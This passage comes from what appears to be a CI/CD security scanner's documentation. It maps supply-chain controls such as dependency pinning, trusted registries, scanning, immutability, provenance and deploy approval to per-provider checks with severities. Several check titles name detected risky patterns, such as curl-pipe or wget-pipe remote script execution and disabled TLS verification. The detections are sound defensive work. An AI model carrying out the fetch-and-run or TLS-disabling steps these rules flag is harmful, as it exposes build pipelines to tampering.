| [`SCM-022`](#detail-scm-022) | Repo Actions permissions allow any source (no allow-list) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`TKN-008`](#detail-tkn-008) | Tekton step script pipes remote install or disables TLS | <span class="pg-sev pg-sev--high">HIGH</span> | [Tekton](../providers/tekton.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`TKN-014`](#detail-tkn-014) | Tekton step script runs unpinned package install | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Tekton](../providers/tekton.md) |  |

### ESF-S-PIN-DEPS: Pin dependencies / actions / images to immutable digests { #ctrl-esf-s-pin-deps }

**Evidenced by 72 checks** across 16 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, Dockerfile, Drone CI, GitHub Actions, GitLab CI, Helm, Jenkins, Kubernetes, Tekton, maven).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ADO-001`](#detail-ado-001) | Task reference not pinned to specific version | <span class="pg-sev pg-sev--high">HIGH</span> | [Azure DevOps](../providers/azure.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`ADO-005`](#detail-ado-005) | Container image not pinned to specific version | <span class="pg-sev pg-sev--high">HIGH</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ADO-009`](#detail-ado-009) | Container image pinned by tag rather than sha256 digest | <span class="pg-sev pg-sev--low">LOW</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ADO-011`](#detail-ado-011) | `template: <local-path>` on PR-validated pipeline | <span class="pg-sev pg-sev--high">HIGH</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ADO-019`](#detail-ado-019) | `extends:` template on PR-validated pipeline points to local path | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ADO-021`](#detail-ado-021) | Package install without lockfile enforcement | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Azure DevOps](../providers/azure.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`ADO-022`](#detail-ado-022) | Dependency update command bypasses lockfile pins | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Azure DevOps](../providers/azure.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`ADO-025`](#detail-ado-025) | Cross-repo template not pinned to commit SHA | <span class="pg-sev pg-sev--high">HIGH</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ADO-028`](#detail-ado-028) | Package install bypasses registry integrity (git / path / tarball source) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ARGO-001`](#detail-argo-001) | Argo template container image not pinned to a digest | <span class="pg-sev pg-sev--high">HIGH</span> | [Argo Workflows](../providers/argo.md) |  |
| [`ARGO-014`](#detail-argo-014) | Argo template script runs unpinned package install | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Argo Workflows](../providers/argo.md) |  |
| [`BB-001`](#detail-bb-001) | pipe: action not pinned to exact version | <span class="pg-sev pg-sev--high">HIGH</span> | [Bitbucket](../providers/bitbucket.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BB-009`](#detail-bb-009) | pipe: pinned by version rather than sha256 digest | <span class="pg-sev pg-sev--low">LOW</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BB-021`](#detail-bb-021) | Package install without lockfile enforcement | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BB-022`](#detail-bb-022) | Dependency update command bypasses lockfile pins | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BB-027`](#detail-bb-027) | Package install bypasses registry integrity (git / path / tarball source) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BB-029`](#detail-bb-029) | image: (step or service) not pinned by sha256 digest | <span class="pg-sev pg-sev--high">HIGH</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BK-001`](#detail-bk-001) | Buildkite plugin not pinned to an exact version | <span class="pg-sev pg-sev--high">HIGH</span> | [Buildkite](../providers/buildkite.md) |  |
| [`BK-014`](#detail-bk-014) | Step commands run unpinned package installs | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Buildkite](../providers/buildkite.md) |  |
| [`CB-005`](#detail-cb-005) | Outdated managed build image | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`CB-009`](#detail-cb-009) | CodeBuild image not pinned by digest | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`CC-001`](#detail-cc-001) | Orb not pinned to exact semver | <span class="pg-sev pg-sev--high">HIGH</span> | [CircleCI](../providers/circleci.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`CC-003`](#detail-cc-003) | Docker image not pinned by digest | <span class="pg-sev pg-sev--high">HIGH</span> | [CircleCI](../providers/circleci.md) |  |
| [`CC-021`](#detail-cc-021) | Package install without lockfile enforcement | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`CC-022`](#detail-cc-022) | Dependency update command bypasses lockfile pins | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`CC-028`](#detail-cc-028) | Package install bypasses registry integrity (git / path / tarball source) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`CC-029`](#detail-cc-029) | Machine executor image not pinned | <span class="pg-sev pg-sev--high">HIGH</span> | [CircleCI](../providers/circleci.md) |  |
| [`DF-001`](#detail-df-001) | FROM image not pinned to sha256 digest | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`DF-009`](#detail-df-009) | ADD used where COPY would suffice | <span class="pg-sev pg-sev--low">LOW</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-010`](#detail-df-010) | apt-get dist-upgrade / upgrade pulls unknown package versions | <span class="pg-sev pg-sev--low">LOW</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-022`](#detail-df-022) | RUN uses npm install instead of npm ci | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DR-001`](#detail-dr-001) | Step image not pinned to a digest | <span class="pg-sev pg-sev--high">HIGH</span> | [Drone CI](../providers/drone.md) |  |
| [`DR-005`](#detail-dr-005) | Plugin step uses a floating image tag | <span class="pg-sev pg-sev--high">HIGH</span> | [Drone CI](../providers/drone.md) |  |
| [`DR-008`](#detail-dr-008) | Step uses ``pull: never`` (skips registry verification) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Drone CI](../providers/drone.md) |  |
| [`DR-010`](#detail-dr-010) | Step commands run unpinned package installs | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Drone CI](../providers/drone.md) |  |
| [`GCB-001`](#detail-gcb-001) | Cloud Build step image not pinned by digest | <span class="pg-sev pg-sev--high">HIGH</span> | [Cloud Build](../providers/cloudbuild.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GCB-004`](#detail-gcb-004) | dynamicSubstitutions on with user substitutions in step args | <span class="pg-sev pg-sev--high">HIGH</span> | [Cloud Build](../providers/cloudbuild.md) |  |
| [`GCB-007`](#detail-gcb-007) | availableSecrets references ``versions/latest`` | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Cloud Build](../providers/cloudbuild.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GCB-025`](#detail-gcb-025) | Build has no tags for audit / discoverability | <span class="pg-sev pg-sev--low">LOW</span> | [Cloud Build](../providers/cloudbuild.md) |  |
| [`GHA-001`](#detail-gha-001) | Action not pinned to commit SHA | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-010`](#detail-gha-010) | Local action (./path) on untrusted-trigger workflow | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-021`](#detail-gha-021) | Package install without lockfile enforcement | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-022`](#detail-gha-022) | Dependency update command bypasses lockfile pins | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-025`](#detail-gha-025) | Reusable workflow not pinned to commit SHA | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-029`](#detail-gha-029) | Package install bypasses registry integrity (git / path / tarball source) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-051`](#detail-gha-051) | services / container image is not pinned by digest | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
| [`GL-001`](#detail-gl-001) | Image not pinned to specific version or digest | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GL-005`](#detail-gl-005) | include: pulls remote / project without pinned ref | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`GL-009`](#detail-gl-009) | Image pinned to version tag rather than sha256 digest | <span class="pg-sev pg-sev--low">LOW</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`GL-011`](#detail-gl-011) | include: local file pulled in MR-triggered pipeline | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`GL-021`](#detail-gl-021) | Package install without lockfile enforcement | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GL-022`](#detail-gl-022) | Dependency update command bypasses lockfile pins | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GL-027`](#detail-gl-027) | Package install bypasses registry integrity (git / path / tarball source) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`GL-028`](#detail-gl-028) | services: image not pinned | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`GL-030`](#detail-gl-030) | trigger: include: pulls child pipeline without pinned ref | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`HELM-001`](#detail-helm-001) | Chart.yaml declares legacy apiVersion: v1 | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Helm](../providers/helm.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`HELM-002`](#detail-helm-002) | Chart.lock missing per-dependency digests | <span class="pg-sev pg-sev--high">HIGH</span> | [Helm](../providers/helm.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`HELM-004`](#detail-helm-004) | Chart dependency version is a range, not an exact pin | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Helm](../providers/helm.md) |  |
| [`HELM-008`](#detail-helm-008) | Chart.lock generated more than 90 days ago | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Helm](../providers/helm.md) |  |
| [`JF-001`](#detail-jf-001) | Shared library not pinned to a tag or commit | <span class="pg-sev pg-sev--high">HIGH</span> | [Jenkins](../providers/jenkins.md) |  |
| [`JF-009`](#detail-jf-009) | Agent docker image not pinned to sha256 digest | <span class="pg-sev pg-sev--high">HIGH</span> | [Jenkins](../providers/jenkins.md) |  |
| [`JF-012`](#detail-jf-012) | `load` step pulls Groovy from disk without integrity pin | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) |  |
| [`JF-021`](#detail-jf-021) | Package install without lockfile enforcement | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`JF-022`](#detail-jf-022) | Dependency update command bypasses lockfile pins | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`JF-031`](#detail-jf-031) | Package install bypasses registry integrity (git / path / tarball source) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) |  |
| [`K8S-001`](#detail-k8s-001) | Container image not pinned by sha256 digest | <span class="pg-sev pg-sev--high">HIGH</span> | [Kubernetes](../providers/kubernetes.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`K8S-036`](#detail-k8s-036) | ServiceAccount imagePullSecrets references missing Secret | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`MVN-001`](#detail-mvn-001) | pom.xml dependency uses a floating version range | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [maven](../providers/maven.md) |  |
| [`MVN-002`](#detail-mvn-002) | pom.xml depends on a mutable SNAPSHOT version | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [maven](../providers/maven.md) |  |
| [`MVN-004`](#detail-mvn-004) | pom.xml dependency omits an explicit ``<version>`` | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [maven](../providers/maven.md) |  |
| [`TKN-001`](#detail-tkn-001) | Tekton step image not pinned to a digest | <span class="pg-sev pg-sev--high">HIGH</span> | [Tekton](../providers/tekton.md) |  |
| [`TKN-014`](#detail-tkn-014) | Tekton step script runs unpinned package install | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Tekton](../providers/tekton.md) |  |

### ESF-S-TRUSTED-REG: Use only trusted, authenticated package and image registries { #ctrl-esf-s-trusted-reg }

**Evidenced by 25 checks** across 15 providers (AWS, Argo Workflows, Azure DevOps, Buildkite, Cloud Build, Dockerfile, Drone CI, GitLab CI, Helm, Jenkins, Kubernetes, OCI manifest, SCM, Tekton, maven).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ADO-005`](#detail-ado-005) | Container image not pinned to specific version | <span class="pg-sev pg-sev--high">HIGH</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ARGO-008`](#detail-argo-008) | Argo script source pipes remote install or disables TLS | <span class="pg-sev pg-sev--high">HIGH</span> | [Argo Workflows](../providers/argo.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`ARGO-015`](#detail-argo-015) | Input artifact pulls from an insecure (non-HTTPS) URL | <span class="pg-sev pg-sev--high">HIGH</span> | [Argo Workflows](../providers/argo.md) |  |
| [`BK-008`](#detail-bk-008) | TLS verification disabled in step command | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Buildkite](../providers/buildkite.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`CA-002`](#detail-ca-002) | CodeArtifact repository has a public external connection | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`DF-004`](#detail-df-004) | RUN executes a remote script via curl-pipe / wget-pipe | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-021`](#detail-df-021) | RUN pip install bypasses TLS or uses an HTTP index | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-026`](#detail-df-026) | ENV disables Node.js TLS certificate verification | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-027`](#detail-df-027) | ENV disables Python HTTPS certificate verification | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-028`](#detail-df-028) | ENV disables Git TLS certificate verification | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-029`](#detail-df-029) | ENV neuters Python requests CA bundle | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DR-006`](#detail-dr-006) | TLS verification disabled in step commands | <span class="pg-sev pg-sev--high">HIGH</span> | [Drone CI](../providers/drone.md) |  |
| [`ECR-003`](#detail-ecr-003) | Repository policy allows public access | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [AWS](../providers/aws.md) |  |
| [`ECR-006`](#detail-ecr-006) | ECR pull-through cache rule uses an untrusted upstream | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`GCB-018`](#detail-gcb-018) | Legacy KMS secrets block in use (prefer availableSecrets / Secret Manager) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Cloud Build](../providers/cloudbuild.md) |  |
| [`GL-005`](#detail-gl-005) | include: pulls remote / project without pinned ref | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`HELM-003`](#detail-helm-003) | Chart dependency declared on a non-HTTPS repository | <span class="pg-sev pg-sev--high">HIGH</span> | [Helm](../providers/helm.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`HELM-009`](#detail-helm-009) | Chart home / sources URL uses a non-HTTPS scheme | <span class="pg-sev pg-sev--low">LOW</span> | [Helm](../providers/helm.md) |  |
| [`JF-035`](#detail-jf-035) | httpRequest step disables SSL verification | <span class="pg-sev pg-sev--high">HIGH</span> | [Jenkins](../providers/jenkins.md) |  |
| [`K8S-027`](#detail-k8s-027) | Ingress has no TLS configuration | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`MVN-003`](#detail-mvn-003) | pom.xml declares a plaintext-HTTP Maven repository | <span class="pg-sev pg-sev--high">HIGH</span> | [maven](../providers/maven.md) |  |
| [`MVN-007`](#detail-mvn-007) | settings.xml mirror routes external traffic through one repo | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [maven](../providers/maven.md) |  |
| [`OCI-004`](#detail-oci-004) | Image layer references an arbitrary URL (foreign layer) | <span class="pg-sev pg-sev--high">HIGH</span> | [OCI manifest](../providers/oci.md) |  |
| [`SCM-022`](#detail-scm-022) | Repo Actions permissions allow any source (no allow-list) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`TKN-008`](#detail-tkn-008) | Tekton step script pipes remote install or disables TLS | <span class="pg-sev pg-sev--high">HIGH</span> | [Tekton](../providers/tekton.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |

### ESF-S-VULN-MGMT: Scan inbound artifacts (images, packages) for known vulnerabilities { #ctrl-esf-s-vuln-mgmt }

**Evidenced by 21 checks** across 13 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, GitHub Actions, GitLab CI, Jenkins, SCM, Tekton, maven).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ADO-020`](#detail-ado-020) | No vulnerability scanning step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ARGO-012`](#detail-argo-012) | No vulnerability scanning step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Argo Workflows](../providers/argo.md) |  |
| [`BB-015`](#detail-bb-015) | No vulnerability scanning step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BK-012`](#detail-bk-012) | No vulnerability scanning step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Buildkite](../providers/buildkite.md) |  |
| [`CC-020`](#detail-cc-020) | No vulnerability scanning step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`ECR-001`](#detail-ecr-001) | Image scanning on push not enabled | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`ECR-007`](#detail-ecr-007) | Inspector v2 enhanced scanning disabled for ECR | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`GCB-012`](#detail-gcb-012) | Credential-shaped literal in pipeline body | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Cloud Build](../providers/cloudbuild.md) |  |
| [`GHA-020`](#detail-gha-020) | No vulnerability scanning step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-040`](#detail-gha-040) | Action reference matches a known-compromised SHA or tag | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) |  |
| [`GL-019`](#detail-gl-019) | No vulnerability scanning step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`JF-020`](#detail-jf-020) | No vulnerability scanning step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) |  |
| [`MVN-006`](#detail-mvn-006) | pom.xml pins a known-compromised Maven Central artifact version | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [maven](../providers/maven.md) |  |
| [`SCM-003`](#detail-scm-003) | GitHub default code scanning is not enabled | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-005`](#detail-scm-005) | Dependabot security updates are not enabled | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-016`](#detail-scm-016) | Private vulnerability reporting is not enabled | <span class="pg-sev pg-sev--low">LOW</span> | [SCM](../providers/scm.md) |  |
| [`SCM-040`](#detail-scm-040) | Active ruleset doesn't gate on code scanning results | <span class="pg-sev pg-sev--low">LOW</span> | [SCM](../providers/scm.md) |  |
| [`SCM-045`](#detail-scm-045) | Default code scanning uses the limited query suite | <span class="pg-sev pg-sev--low">LOW</span> | [SCM](../providers/scm.md) |  |
| [`SCM-046`](#detail-scm-046) | Default code scanning is configured but paused | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-047`](#detail-scm-047) | Repo language excluded from default code-scanning coverage | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`TKN-012`](#detail-tkn-012) | No vulnerability scanning step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Tekton](../providers/tekton.md) |  |

### ESF-S-IMMUTABLE: Enforce artifact / tag immutability to preserve provenance { #ctrl-esf-s-immutable }

**Evidenced by 12 checks** across 9 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Drone CI, GitLab CI, Jenkins, OCI manifest, Tekton).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ADO-009`](#detail-ado-009) | Container image pinned by tag rather than sha256 digest | <span class="pg-sev pg-sev--low">LOW</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ARGO-001`](#detail-argo-001) | Argo template container image not pinned to a digest | <span class="pg-sev pg-sev--high">HIGH</span> | [Argo Workflows](../providers/argo.md) |  |
| [`ATTEST-005`](#detail-attest-005) | In-toto Statement subject is missing or unpinned | <span class="pg-sev pg-sev--high">HIGH</span> | [OCI manifest](../providers/oci.md) |  |
| [`BB-009`](#detail-bb-009) | pipe: pinned by version rather than sha256 digest | <span class="pg-sev pg-sev--low">LOW</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`DR-001`](#detail-dr-001) | Step image not pinned to a digest | <span class="pg-sev pg-sev--high">HIGH</span> | [Drone CI](../providers/drone.md) |  |
| [`ECR-002`](#detail-ecr-002) | Image tags are mutable | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`GL-009`](#detail-gl-009) | Image pinned to version tag rather than sha256 digest | <span class="pg-sev pg-sev--low">LOW</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`JF-009`](#detail-jf-009) | Agent docker image not pinned to sha256 digest | <span class="pg-sev pg-sev--high">HIGH</span> | [Jenkins](../providers/jenkins.md) |  |
| [`OCI-007`](#detail-oci-007) | Image manifest uses legacy schemaVersion 1 (no content addressing) | <span class="pg-sev pg-sev--high">HIGH</span> | [OCI manifest](../providers/oci.md) |  |
| [`OCI-008`](#detail-oci-008) | Manifest references digest using unsupported hash algorithm | <span class="pg-sev pg-sev--high">HIGH</span> | [OCI manifest](../providers/oci.md) |  |
| [`S3-003`](#detail-s3-003) | Artifact bucket versioning not enabled | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`TKN-001`](#detail-tkn-001) | Tekton step image not pinned to a digest | <span class="pg-sev pg-sev--high">HIGH</span> | [Tekton](../providers/tekton.md) |  |

### ESF-S-PROVENANCE: Generate and verify provenance metadata (SLSA / in-toto) for produced artifacts { #ctrl-esf-s-provenance }

**Evidenced by 9 checks** across 4 providers (Argo Workflows, Buildkite, OCI manifest, Tekton).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ARGO-011`](#detail-argo-011) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Argo Workflows](../providers/argo.md) |  |
| [`ATTEST-001`](#detail-attest-001) | SLSA provenance attests an untrusted builder identity | <span class="pg-sev pg-sev--high">HIGH</span> | [OCI manifest](../providers/oci.md) |  |
| [`ATTEST-002`](#detail-attest-002) | SLSA provenance source-repo claim is missing or unverifiable | <span class="pg-sev pg-sev--high">HIGH</span> | [OCI manifest](../providers/oci.md) |  |
| [`ATTEST-004`](#detail-attest-004) | SLSA provenance ships without a resolved-dependencies set | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [OCI manifest](../providers/oci.md) |  |
| [`ATTEST-005`](#detail-attest-005) | In-toto Statement subject is missing or unpinned | <span class="pg-sev pg-sev--high">HIGH</span> | [OCI manifest](../providers/oci.md) |  |
| [`ATTEST-006`](#detail-attest-006) | SLSA provenance lacks a meaningful buildType | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [OCI manifest](../providers/oci.md) |  |
| [`BK-011`](#detail-bk-011) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Buildkite](../providers/buildkite.md) |  |
| [`OCI-002`](#detail-oci-002) | Image is missing a build attestation manifest | <span class="pg-sev pg-sev--high">HIGH</span> | [OCI manifest](../providers/oci.md) |  |
| [`TKN-011`](#detail-tkn-011) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Tekton](../providers/tekton.md) |  |

### ESF-C-APPROVAL: Require explicit approval before production deployment { #ctrl-esf-c-approval }

**Evidenced by 22 checks** across 9 providers (AWS, Azure DevOps, Bitbucket, Buildkite, CircleCI, GitHub Actions, GitLab CI, Jenkins, SCM).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ADO-004`](#detail-ado-004) | Deployment job missing environment binding | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ADO-029`](#detail-ado-029) | Service-connection-using job without environment or branch gate | <span class="pg-sev pg-sev--high">HIGH</span> | [Azure DevOps](../providers/azure.md) |  |
| [`BB-004`](#detail-bb-004) | Deploy step missing `deployment:` environment gate | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BB-028`](#detail-bb-028) | OIDC step without deployment-gated environment | <span class="pg-sev pg-sev--high">HIGH</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BK-007`](#detail-bk-007) | Deploy step not gated by a manual block / input | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Buildkite](../providers/buildkite.md) |  |
| [`CC-009`](#detail-cc-009) | Deploy job missing manual approval gate | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`CC-013`](#detail-cc-013) | Deploy job in workflow has no branch filter | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`CC-030`](#detail-cc-030) | Workflow job uses context without branch filter or approval gate | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`CC-031`](#detail-cc-031) | OIDC role assumption without branch filter or approval gate | <span class="pg-sev pg-sev--high">HIGH</span> | [CircleCI](../providers/circleci.md) |  |
| [`CD-002`](#detail-cd-002) | AllAtOnce deployment config, no canary or rolling strategy | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`CP-001`](#detail-cp-001) | No approval action before deploy stages | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`CP-005`](#detail-cp-005) | Production Deploy stage has no preceding ManualApproval | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
